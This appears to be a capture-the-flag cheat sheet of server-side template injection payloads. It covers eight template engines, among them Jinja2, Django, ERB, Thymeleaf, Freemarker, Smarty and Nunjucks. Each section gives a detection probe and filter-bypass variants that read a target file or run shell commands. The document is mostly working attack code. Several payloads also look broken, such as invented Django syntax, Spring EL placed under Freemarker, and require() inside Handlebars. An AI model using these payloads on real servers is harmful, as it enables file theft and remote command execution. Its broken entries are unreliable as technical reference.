# Server-side template injection

Test Queries: Enter the commands that will cause the error and look at the specific messages to determine the ENGINE.

# Exploitation of SSTI to access /home/vova/secret by languages ​​and template systems

## Python (Jinja2)

```
{{ }}, {% %}, {{7*7}} = 49
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/home/vova/secret').read() }}
```

ByPass:
```
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/'.join(['home', 'vova', 'secret'])).read() }}
{{ ''[''].__class__.__mro__[1].__subclasses__()[40]('/home/vova/secret').read() }}
{{ config.from_pyfile('/home/vova/secret') }}
```

## Python (Tornado)

```
{{ }}, {% %}, {{7*7}} = 49
{{ open('/home/vova/secret').read() }}
```

ByPass:
```
{% set subprocess = __import__('subprocess') %}
{{ subprocess.check_output('cat /home/vova/secret', shell=True) }}

{{ os.environ['HOME'] + '/vova/secret' }}

{{ ''.__class__.__mro__[1].__subclasses__()[40]('/home/vova/secret').read() }}
```

## Python (Django)

```
{{ }}, {% %}, {{7*7}} = 49
{{ ''|add:''|add:''.subprocess.Popen("cat /home/vova/secret", shell=True, stdout=-1).communicate }}
```

ByPass:
```
{{ ''|add:''.os.popen("cat /home/vova/secret").read }}
{{ ''|add:''.os.getenv("HOME") + "/vova/secret" }}
{{ ''|add:''.__class__.__mro__[1].__subclasses__()[40]("/home/vova/secret").read() }}
```

## Ruby (ERB)

```
<%= %>, <%= 7 * 7 %> = 49
<%= File.read('/home/vova/secret') %>
```

ByPass:
```
<%= IO.readlines('/home/vova/secret') %>
<%= ENV["HOME"] %>/vova/secret
<%= Kernel.open('/home/vova/secret').read %>
```

## Java (Thymeleaf)

```
th:text, ${}, ${7*7} = 49
${new java.util.Scanner(new java.io.File("/home/vova/secret")).useDelimiter("\\A").next()}
```

ByPass:
```
${T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/home/vova/secret'))}
${new java.util.Scanner(new java.io.File('/home/vova/secret')).useDelimiter("\\A").next()}
${new java.io.BufferedReader(new java.io.FileReader('/home/vova/secret')).lines().toArray()}
```

## Java (Freemarker)

```
th:text, ${}, ${7*7} = 49
${T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/home/vova/secret'))?string}
```

ByPass:
```
${new java.util.Scanner(new java.io.File('/home/vova/secret')).useDelimiter("\\A").next()}
${new java.io.BufferedReader(new java.io.FileReader('/home/vova/secret')).lines().toArray()}
${T(java.lang.Runtime).getRuntime().exec('cat /home/vova/secret')}
```

## PHP (Smarty)

```
{ },{7*7} = 49
{file_get_contents('/home/vova/secret')}
```

ByPass:
```
{readfile('/home/vova/secret')}

{assign var="file" value=fopen('/home/vova/secret', 'r')}
{while !feof($file)}{fgets($file)}{/while}

{getenv("HOME")}/vova/secret
```

## Node.js (Handlebars, Nunjucks)

```
{{ }}, {{7*7}} = 49 //Handlebars
{% %}, {% 7*7 %} = 49 //Nunjucks

{% set fs = require('fs') %}
{{ fs.readFileSync('/home/vova/secret', 'utf-8') }}
```

ByPass:
```
{% set fs = require('fs') %}
{{ fs.readFileSync('/home/vova/secret', 'utf-8') }}

{% set cp = require('child_process') %}
{{ cp.execSync('cat /home/vova/secret') }}

{% set fs = require('fs') %}
{{ fs.readFileSync(String.fromCharCode(47, 104, 111, 109, 101, 47, 118, 111, 118, 97, 47, 115, 101, 99, 114, 101, 116), 'utf-8') }}

```
